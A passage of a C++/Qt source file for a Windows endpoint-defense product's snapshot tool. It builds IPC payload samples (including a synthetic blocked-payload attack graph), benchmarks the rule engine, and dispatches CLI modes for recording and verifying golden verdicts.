                 << static_cast<int>(EventType::NetworkConnect);
        tq.actions << static_cast<int>(VerdictAction::Block);
        tq.minRiskScore = 50;
        tq.pid = 4242;
        tq.includeProcessTree = true;
        tq.text = QString::fromUtf8("临时目录");
        tq.limit = 2000;
        p[QStringLiteral("timelineRequestFilled")] = tq.toJson();
    }

    // ---- 攻击图 ----
    {
        AttackGraphRequestPayload gq;
        gq.requestId = QUuid{};
        p[QStringLiteral("graphRequestDefaults")] = gq.toJson();
        gq.requestId = stableId(QStringLiteral("ipc-graph-req"));
        gq.seedEventId = stableId(QStringLiteral("ipc-evt"));
        gq.rootPid = 1000;
        gq.windowSeconds = 7200;
        p[QStringLiteral("graphRequestFilled")] = gq.toJson();

        p[QStringLiteral("graphResponseDefaults")] = AttackGraphResponsePayload{}.toJson();

        bulwark::AttackGraph g;
        g.seedEventId = stableId(QStringLiteral("ipc-evt"));
        g.rootPid = 1000;
        g.rootLabel = QStringLiteral("explorer.exe");
        g.techniques << QStringLiteral("T1055") << QStringLiteral("T1003.001");
        g.firstUtc = t0.addSecs(-60);
        g.lastUtc = t0;
        g.maxRiskScore = 87;
        g.eventCount = 3;
        g.truncated = false;
        g.summary = QString::fromUtf8("2 个进程 · 3 次行为 · 已拦截 1 次");
        {
            // 进程节点:pid > 0,故 pid / parentPid 两个键都出现。
            bulwark::AttackGraphNode n;
            n.id = QStringLiteral("p:1000:1768478400000");
            n.kind = bulwark::AttackNodeKind::Process;
            n.label = QStringLiteral("explorer.exe");
            n.detail = QStringLiteral("C:\\Windows\\explorer.exe");
            n.pid = 1000;
            n.parentPid = 900;
            n.path = QStringLiteral("C:\\Windows\\explorer.exe");
            n.commandLine = QStringLiteral("explorer.exe");
            n.signedActor = true;
            n.publisher = QStringLiteral("Microsoft Windows");
            n.riskScore = 10;
            n.blocked = false;
            n.isSeed = false;
            n.isRoot = true;
            n.depth = 0;
            n.originKind = ProcessOriginKind::Interactive;
            n.originLabel = QString::fromUtf8("交互式启动");
            n.eventCount = 1;
            n.firstSeenUtc = t0.addSecs(-60);
            n.lastSeenUtc = t0.addSecs(-60);
            g.nodes.append(n);
        }
        {
            // 非进程节点:pid == 0,故 pid / parentPid / path / commandLine 全部不出现。
            bulwark::AttackGraphNode n;
            n.id = QStringLiteral("File:c:\\programdata\\evil\\payload.dll");
            n.kind = bulwark::AttackNodeKind::File;
            n.label = QStringLiteral("payload.dll");
            n.detail = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
            n.riskScore = 70;
            n.blocked = true;
            n.eventCount = 1;
            g.nodes.append(n);
        }
        {
            bulwark::AttackGraphEdge e;
            e.eventId = stableId(QStringLiteral("ipc-evt"));
            e.fromId = QStringLiteral("p:1000:1768478400000");
            e.toId = QStringLiteral("File:c:\\programdata\\evil\\payload.dll");
            e.type = EventType::FileWrite;
            e.label = QString::fromUtf8("写入文件");
            e.detail = QString::fromUtf8("释放载荷");
            e.timestampUtc = t0;
            e.riskScore = 70;
            e.action = VerdictAction::Block;
            e.enforcement = bulwark::EnforcementOutcome::KernelBlocked;
            e.hasThreatIndicator = true;
            e.techniques << QStringLiteral("T1105");
            e.inferred = false; // inferred 为假 -> 整个键不出现
            g.edges.append(e);
            // 推导边:inferred 为真 -> 键出现
            e.eventId = QUuid{};
            e.fromId = QStringLiteral("p:900:0");
            e.toId = QStringLiteral("p:1000:1768478400000");
            e.type = EventType::ProcessCreate;
            e.label = QString::fromUtf8("创建进程");
            e.detail = QString();
            e.riskScore = 0;
            e.action = VerdictAction::Allow;
            e.enforcement = bulwark::EnforcementOutcome::NotApplicable;
            e.hasThreatIndicator = false;
            e.techniques.clear(); // 空列表 -> 整个键不出现
            e.inferred = true;
            g.edges.append(e);
        }
        p[QStringLiteral("attackGraphFilled")] = g.toJson();
        p[QStringLiteral("attackGraphEmpty")] = bulwark::AttackGraph{}.toJson();

        AttackGraphResponsePayload gr;
        gr.requestId = stableId(QStringLiteral("ipc-graph-res"));
        gr.success = true;
        gr.message = QString::fromUtf8("已构建");
        gr.graph = g;
        p[QStringLiteral("graphResponseFilled")] = gr.toJson();
    }

    // ---- 进程管理 ----
    {
        ProcessListRequestPayload pq;
        pq.requestId = QUuid{};
        p[QStringLiteral("processListRequestDefaults")] = pq.toJson();
        pq.requestId = stableId(QStringLiteral("ipc-proc-req"));
        pq.includeCommandLine = false;
        pq.resolveOrigin = false;
        p[QStringLiteral("processListRequestBothOff")] = pq.toJson();

        // 填满:所有条件输出的键都出现。
        bulwark::ProcessEntry e;
        e.pid = 4242;
        e.parentPid = 1000;
        e.name = QStringLiteral("svchost.exe");
        e.imagePath = QStringLiteral("C:\\Windows\\System32\\svchost.exe");
        e.commandLine = QStringLiteral("svchost.exe -k netsvcs -p");
        e.parentName = QStringLiteral("services.exe");
        e.userName = QStringLiteral("NT AUTHORITY\\SYSTEM");
        e.startTimeUtc = t0.addSecs(-7200);
        e.workingSetBytes = 8589934592LL; // > 2^32
        e.threadCount = 23;
        e.sessionId = 0;
        e.is64Bit = true;
        e.elevated = true;
        e.isSigned = true;
        e.signatureMismatch = false;
        e.publisher = QStringLiteral("Microsoft Windows Publisher");
        e.fileDescription = QStringLiteral("Host Process for Windows Services");
        e.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        e.originKind = ProcessOriginKind::Service;
        e.originService = QStringLiteral("Schedule, BITS");
        e.originServiceDisplay = QStringLiteral("Task Scheduler");
        e.originTask = QString();
        e.originDetail = QString::fromUtf8("由 SCM 派生,置信度高");
        e.isCritical = true;
        e.isProtectedSelf = false;
        e.isTrusted = true;
        e.riskScore = 5;
        e.riskReasons << QString::fromUtf8("共享服务宿主");
        p[QStringLiteral("processEntryFilled")] = e.toJson();
        // 全默认:一堆条件键都不出现,而 is64Bit 默认是 true(唯一默认非零的布尔)。
        p[QStringLiteral("processEntryDefaults")] = bulwark::ProcessEntry{}.toJson();

        ProcessListResponsePayload pl;
        pl.requestId = pq.requestId;
        pl.snapshotUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        pl.processes << e << bulwark::ProcessEntry{};
        pl.message = QString::fromUtf8("共 2 个进程");
        p[QStringLiteral("processListResponseFilled")] = pl.toJson();

        ProcessActionRequestPayload aq;
        aq.requestId = QUuid{};
        p[QStringLiteral("processActionRequestDefaults")] = aq.toJson();
        aq.requestId = stableId(QStringLiteral("ipc-proc-act-req"));
        aq.kind = ProcessActionKind::QuarantineImage;
        aq.pid = 4242;
        aq.imagePath = e.imagePath;
        p[QStringLiteral("processActionRequestFilled")] = aq.toJson();

        // sha256 为空 -> 整个键不出现;非空 -> 出现。两条都钉。
        ProcessActionResultPayload ar;
        ar.requestId = aq.requestId;
        ar.kind = ProcessActionKind::Terminate;
        ar.pid = 4242;
        ar.success = false;
        ar.message = QString::fromUtf8("关键系统进程,拒绝结束");
        p[QStringLiteral("processActionResultNoHash")] = ar.toJson();
        ar.kind = ProcessActionKind::ComputeHash;
        ar.success = true;
        ar.message = QString::fromUtf8("已计算");
        ar.sha256 = e.sha256;
        p[QStringLiteral("processActionResultWithHash")] = ar.toJson();
    }

    // ---- 磁盘垃圾清理 ----
    //
    // 两条钉住的要点(它们各自都曾是别处出过问题的形态):
    //   · 扫描请求的 categories 为空时【键不出现】(空 = 全部,靠键缺失表达即可);
    //   · 清理请求的 categories 为空时【键仍要出现】—— 空数组在那里有明确含义(什么都不清理),
    //     靠键缺失表达会让解析侧分不清「用户没选」和「旧版本没这个字段」。
    {
        JunkScanRequestPayload sq;
        sq.requestId = QUuid{};
        p[QStringLiteral("junkScanRequestDefaults")] = sq.toJson();
        sq.requestId = stableId(QStringLiteral("ipc-junk-scan-req"));
        sq.categories << static_cast<int>(bulwark::junk::Category::WindowsTemp)
                      << static_cast<int>(bulwark::junk::Category::BrowserCache);
        sq.minAgeHours = 48;
        p[QStringLiteral("junkScanRequestFilled")] = sq.toJson();

        bulwark::JunkLocation loc;
        loc.path = QStringLiteral("C:\\Windows\\Temp");
        loc.note = QString::fromUtf8("仅统计 24 小时前的文件");
        loc.bytes = 5368709120LL;   // > 2^32,确认大数走 double 仍能原样往返
        loc.fileCount = 18342;
        loc.skipped = 27;
        loc.unreadable = 4;         // 「有子目录读不进去」这一状态必须能过线
        p[QStringLiteral("junkLocationFilled")] = loc.toJson();
        p[QStringLiteral("junkLocationDefaults")] = bulwark::JunkLocation{}.toJson();

        bulwark::JunkCategoryResult cat;
        cat.category = bulwark::junk::Category::WindowsTemp;
        cat.risk = bulwark::junk::Risk::Safe;
        cat.title = QString::fromUtf8("系统与用户临时文件");
        cat.description = QString::fromUtf8("程序运行时留下的中间文件。");
        cat.recommended = true;
        cat.available = true;
        cat.cleanable = true;
        cat.bytes = loc.bytes;
        cat.fileCount = loc.fileCount;
        cat.skipped = loc.skipped;
        cat.unreadable = loc.unreadable;
        cat.elapsedMs = 1234;
        cat.locations << loc;
        p[QStringLiteral("junkCategoryFilled")] = cat.toJson();
        // 全默认:categoryKey 仍要出现(它由 category 派生,不是可选字段)。
        p[QStringLiteral("junkCategoryDefaults")] = bulwark::JunkCategoryResult{}.toJson();

        // 「只统计不清理」那一类的形态:available 为真但 cleanable 为假。
        bulwark::JunkCategoryResult scanOnly;
        scanOnly.category = bulwark::junk::Category::WindowsOld;
        scanOnly.risk = bulwark::junk::Risk::Caution;
        scanOnly.title = QString::fromUtf8("旧版 Windows 升级残留");
        scanOnly.description = QString::fromUtf8("只报告体积,不代为删除。");
        scanOnly.available = true;
        scanOnly.cleanable = false;
        scanOnly.bytes = 21474836480LL;
        scanOnly.message = QString::fromUtf8("仅统计体积,本产品不代为删除。");
        p[QStringLiteral("junkCategoryScanOnly")] = scanOnly.toJson();

        JunkScanResponsePayload sr;
        sr.requestId = sq.requestId;
        sr.scannedUtc = t0;   // 默认是 currentDateTimeUtc(),必须显式给
        sr.enabled = true;
        sr.categories << cat << scanOnly;
        sr.totalBytes = cat.bytes;
        sr.totalFiles = cat.fileCount;
        sr.minAgeHours = 24;
        sr.truncated = true;
        sr.unreadable = 4;
        sr.elapsedMs = 4210;
        sr.message = QString::fromUtf8("扫描达到上限,结果为下限估计。");
        p[QStringLiteral("junkScanResponseFilled")] = sr.toJson();
        {
            JunkScanResponsePayload empty;
            empty.scannedUtc = t0;
            p[QStringLiteral("junkScanResponseEmpty")] = empty.toJson();
        }

        JunkCleanRequestPayload cq;
        cq.requestId = QUuid{};
        p[QStringLiteral("junkCleanRequestEmptySelection")] = cq.toJson();
        cq.requestId = stableId(QStringLiteral("ipc-junk-clean-req"));
        cq.categories << static_cast<int>(bulwark::junk::Category::WindowsTemp)
                      << static_cast<int>(bulwark::junk::Category::RecycleBin);
        cq.minAgeHours = 12;
        p[QStringLiteral("junkCleanRequestFilled")] = cq.toJson();

        bulwark::JunkCleanOutcome ok;
        ok.category = bulwark::junk::Category::WindowsTemp;
        ok.title = cat.title;
        ok.success = true;
        ok.freedBytes = 4294967296LL;
        ok.deletedFiles = 17900;
        ok.deletedDirs = 812;
        ok.skipped = 442;
        ok.message = QString::fromUtf8("已删除 17900 个文件,跳过 442 个。");
        p[QStringLiteral("junkOutcomeFilled")] = ok.toJson();
        p[QStringLiteral("junkOutcomeDefaults")] = bulwark::JunkCleanOutcome{}.toJson();

        bulwark::JunkCleanOutcome failed;
        failed.category = bulwark::junk::Category::WindowsOld;
        failed.title = scanOnly.title;
        failed.success = false;
        failed.message = QString::fromUtf8("本产品不代为删除该类内容。");

        JunkCleanResponsePayload cr;
        cr.requestId = cq.requestId;
        cr.finishedUtc = t0;  // 默认是 currentDateTimeUtc(),必须显式给
        cr.success = true;
        cr.outcomes << ok << failed;
        cr.freedBytes = ok.freedBytes;
        cr.deletedFiles = ok.deletedFiles;
        cr.skipped = ok.skipped;
        cr.message = QString::fromUtf8("清理完成。");
        p[QStringLiteral("junkCleanResponseFilled")] = cr.toJson();

        // 大文件查找。注意这一对【没有】对应的删除请求 —— 本功能纯只读,详见
        // bulwark/models/JunkEntry.h 里 LargeFileEntry 的说明。
        LargeFileScanRequestPayload lq;
        lq.requestId = QUuid{};
        p[QStringLiteral("largeFileRequestDefaults")] = lq.toJson();
        lq.requestId = stableId(QStringLiteral("ipc-largefile-req"));
        lq.minBytes = 209715200LL;   // 200 MB
        lq.limit = 30;
        p[QStringLiteral("largeFileRequestFilled")] = lq.toJson();

        bulwark::LargeFileEntry lf;
        lf.path = QStringLiteral("C:\\hiberfil.sys");
        lf.bytes = 13647200256LL;    // > 2^32,确认大数走 double 仍原样往返
        lf.lastModifiedUtc = t0.addSecs(-3600);
        lf.suffix = QStringLiteral("sys");
        p[QStringLiteral("largeFileEntryFilled")] = lf.toJson();
        p[QStringLiteral("largeFileEntryDefaults")] = bulwark::LargeFileEntry{}.toJson();

        LargeFileScanResponsePayload lr;
        lr.requestId = lq.requestId;
        lr.scannedUtc = t0;          // 默认是 currentDateTimeUtc(),必须显式给
        lr.enabled = true;
        lr.files << lf;
        lr.minBytes = lq.minBytes;
        lr.totalBytes = lf.bytes;
        lr.scannedFiles = 557486;
        lr.unreadable = 55;
        lr.truncated = false;
        lr.elapsedMs = 44392;
        lr.message = QString::fromUtf8("检视 557486 个文件,列出最大的 1 个。");
        p[QStringLiteral("largeFileResponseFilled")] = lr.toJson();
        {
            LargeFileScanResponsePayload empty;
            empty.scannedUtc = t0;
            p[QStringLiteral("largeFileResponseEmpty")] = empty.toJson();
        }

        JunkProgressPayload pg;
        pg.requestId = QUuid{};
        p[QStringLiteral("junkProgressDefaults")] = pg.toJson();
        pg.requestId = sq.requestId;
        pg.cleaning = true;
        pg.categoryIndex = 2;
        pg.categoryTotal = 5;
        pg.categoryTitle = QString::fromUtf8("浏览器缓存");
        pg.currentPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache");
        pg.bytesSoFar = 1073741824LL;
        pg.filesSoFar = 9312;
        p[QStringLiteral("junkProgressFilled")] = pg.toJson();
    }

    root[QStringLiteral("payloads")] = p;

    if (!writeJson(path, root))
        return 1;
    out() << "已导出 IPC 线格式样本: " << path << "  " << envelopes.size() << " 个信封, "
          << p.size() << " 个 payload\n";
    out().flush();
    return 0;
}

// ======================= 裁决热路径耗时测量(--bench)=======================
//
// --verify 钉住的是「裁决对不对」,这里钉住的是「裁决要花多久」。两者共用同一份语料与同一套
// 可复现设置(钉死时钟 + 内置规则集 + 语料自带用户规则),所以量到的就是生产管线本身。
//
// 为什么值得常驻:evaluate() 是每条内核/ETW 事件都要走一遍的路径,而它在服务主线程上与出队、
// IPC、弹窗超时巡检串行。事件风暴(勒索批量改文件 / 进程爆发)时,这个单条耗时直接决定队列
// 会不会堆到丢弃 —— 也就是会不会漏检。所以它是一个安全指标,不只是性能指标;做性能改动时
// 必须能给出改前改后的可比数字,而不是"感觉快了"。
//
// 读数方式:同一批事件跑 rounds 遍、重复 reps 次,报【最快一次】。最快值比平均值更能代表
// 代码本身的成本 —— 平均值里混进的是本机其它进程造成的调度噪声。
int benchmark(const QString &corpusPath, int rounds)
{
    QJsonObject corpus;
    if (!readJson(corpusPath, &corpus))
        return 1;

    const QString nowIso = corpus.value(QLatin1String("fixedNowUtc")).toString();
    const QDateTime pinned =
        QDateTime::fromString(nowIso, Qt::ISODateWithMs).toTimeZone(QTimeZone::UTC);
    setFixedNowUtcForTest(pinned);

    RuleEngine engine;
    const QJsonObject eng = corpus.value(QLatin1String("engine")).toObject();
    engine.enableBaseline = eng.value(QLatin1String("enableBaseline")).toBool(true);
    engine.trustSignedActors = eng.value(QLatin1String("trustSignedActors")).toBool(true);
    for (const QJsonValue &v : corpus.value(QLatin1String("selfDirectories")).toArray())
        engine.addSelfDirectory(v.toString());
    for (const QJsonValue &v : corpus.value(QLatin1String("canaryFiles")).toArray())
        engine.addCanaryFile(v.toString());

    QVector<DefenseRule> rules = DefaultRules::build();
    for (const QJsonValue &v : corpus.value(QLatin1String("rules")).toArray())
        rules.push_back(DefenseRule::fromJson(v.toObject()));
    engine.loadRules(rules);

    QVector<SecurityEvent> base;
    for (const QJsonValue &cv : corpus.value(QLatin1String("cases")).toArray())
        base.push_back(SecurityEvent::fromJson(cv.toObject().value(QLatin1String("event")).toObject()));

    // 预热:让分支预测 / 分配器进入稳态,不计入。
    for (int w = 0; w < 3; ++w)
        for (const SecurityEvent &src : base) {
            SecurityEvent e = src;
            engine.evaluate(e);
        }

    qint64 best = std::numeric_limits<qint64>::max();
    qint64 total = 0;
    const int reps = 5;
    for (int rep = 0; rep < reps; ++rep) {
        QElapsedTimer t;
        t.start();
        for (int i = 0; i < rounds; ++i)
            for (const SecurityEvent &src : base) {
                SecurityEvent e = src;
                engine.evaluate(e);
            }
        const qint64 ns = t.nsecsElapsed();
        best = qMin(best, ns);
        total += ns;
    }

    const qint64 evts = static_cast<qint64>(rounds) * base.size();
    out() << "规则集 " << rules.size() << " 条,语料 " << base.size() << " 条事件,每轮 "
          << rounds << " 遍 x " << reps << " 次\n";
    out() << "  最快一次: " << (best / 1000000.0) << " ms  ->  "
          << (static_cast<double>(best) / static_cast<double>(evts) / 1000.0)
          << " us/event\n";
    out() << "  平均:     " << (total / reps / 1000000.0) << " ms  ->  "
          << (static_cast<double>(total / reps) / static_cast<double>(evts) / 1000.0)
          << " us/event\n";
    out().flush();
    setFixedNowUtcForTest(QDateTime());
    return 0;
}

void usage()
{
    err() << "用法:\n"
          << "  bulwark_snapshot --bench         <corpus.json> [rounds]\n"
          << "  bulwark_snapshot --gen-corpus    <corpus.json>\n"
          << "  bulwark_snapshot --record        <corpus.json> <golden.json>\n"
          << "  bulwark_snapshot --verify        <corpus.json> <golden.json>\n"
          << "  bulwark_snapshot --check-ruleset\n"
          << "  bulwark_snapshot --dump-rules    <rules.json>\n"
          << "  bulwark_snapshot --dump-models   <models.json>\n"
          << "  bulwark_snapshot --dump-ipc      <ipc.json>\n";
}

} // namespace

int main(int argc, char **argv)
{
    QStringList args;
    for (int i = 1; i < argc; ++i)
        args << QString::fromLocal8Bit(argv[i]);

    if (args.isEmpty()) {
        usage();
        return 2;
    }
    const QString mode = args.at(0);

    if (mode == QLatin1String("--check-ruleset")) {
        setFixedNowUtcForTest(fixedNow());
        const int rc = checkRuleset();
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--bench")) {
        if (args.size() < 2) {
            usage();
            return 2;
        }
        const int rounds = args.size() >= 3 ? args.at(2).toInt() : 200;
        return benchmark(args.at(1), rounds > 0 ? rounds : 200);
    }

    if (mode == QLatin1String("--dump-rules")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        // 钉死时钟:内置规则的 createdUtc 取自构造时的 nowUtc()。
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpRules(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--dump-models")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        // 钉死时钟:VtScanRecord 的 timestampUtc 默认取 nowUtc()。
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpModels(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--dump-ipc")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        /*
            钉死时钟:Evidence 的 timestampUtc 默认取 nowUtc(),内嵌在 EventLogPayload 里。
            注意几个 payload 的时间戳成员用的是 QDateTime::currentDateTimeUtc()(不走
            nowUtc(),钉不住),那些在 dumpIpc 里逐个显式赋值了 —— 见那边的注释。
        */
        setFixedNowUtcForTest(fixedNow());
        const int rc = dumpIpc(args.at(1));
        setFixedNowUtcForTest(QDateTime());
        return rc;
    }

    if (mode == QLatin1String("--gen-corpus")) {
        if (args.size() != 2) {
            usage();
            return 2;
        }
        // 生成语料时也要钉死时钟:事件的 timestampUtc / 证书有效期都相对它计算。
        setFixedNowUtcForTest(fixedNow());
        const QJsonObject corpus = buildCorpus();
        setFixedNowUtcForTest(QDateTime());
        if (!writeJson(args.at(1), corpus))
            return 1;
        out() << "已生成语料: " << args.at(1) << "  用例数 "
              << corpus.value(QLatin1String("cases")).toArray().size() << "\n";
        out().flush();
        return 0;
    }

    if (mode == QLatin1String("--record") || mode == QLatin1String("--verify")) {
        if (args.size() != 3) {
            usage();
            return 2;
        }
        QJsonObject corpus;
        if (!readJson(args.at(1), &corpus))
            return 1;

        QVector<CaseResult> results;
        QString nowIso;
        if (!replay(corpus, &results, &nowIso))
            return 1;

        if (mode == QLatin1String("--record")) {
            QJsonObject root;
            root["schema"] = kSchema;
            root["corpusFixedNowUtc"] = nowIso;
            QJsonArray arr;
            for (const CaseResult &r : results) {
                QJsonObject o;
                o["label"] = r.label;
                o["snapshot"] = r.snapshot;
                arr.append(o);
            }
            root["results"] = arr;
            if (!writeJson(args.at(2), root))
                return 1;
            out() << "已记录黄金裁决: " << args.at(2) << "  用例数 " << results.size() << "\n";
            out().flush();
            return 0;
        }

        QJsonObject golden;
        if (!readJson(args.at(2), &golden))
            return 1;
        const int failed = compare(golden, results);
        out() << "\n" << results.size() << " 条用例," << failed << " 条不一致\n";
        out().flush();
        return failed == 0 ? 0 : 1;
    }

    usage();
    return 2;
}
